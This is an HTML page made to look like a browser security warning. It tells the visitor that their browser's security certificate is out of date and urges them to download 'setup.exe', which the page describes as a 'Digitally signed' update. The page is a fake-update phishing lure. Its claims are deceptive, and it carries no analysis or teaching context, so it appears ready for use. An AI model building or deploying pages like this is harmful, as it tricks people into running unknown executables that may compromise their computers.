<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Certificate Update Required</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .card {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 16px rgba(0,0,0,.12);
            padding: 40px 48px;
            max-width: 480px;
            width: 100%;
            text-align: center;
        }
        .icon { font-size: 56px; margin-bottom: 16px; }
        h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; color: #1a1a1a; }
        p  { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 24px; }
        .btn {
            display: inline-block;
            background: #0078d4;
            color: #fff;
            text-decoration: none;
            padding: 14px 36px;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            transition: background .2s;
        }
        .btn:hover { background: #005a9e; }
        .note { font-size: 11px; color: #999; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔒</div>
        <h1>Security Update Required</h1>
        <p>
            Your browser's security certificate is out of date.<br>
            Download and install the update to continue browsing securely.
        </p>
        <a href="setup.exe" download class="btn">Download Update</a>
        <p class="note">setup.exe &nbsp;·&nbsp; 2.4 MB &nbsp;·&nbsp; Digitally signed</p>
    </div>
</body>
</html>
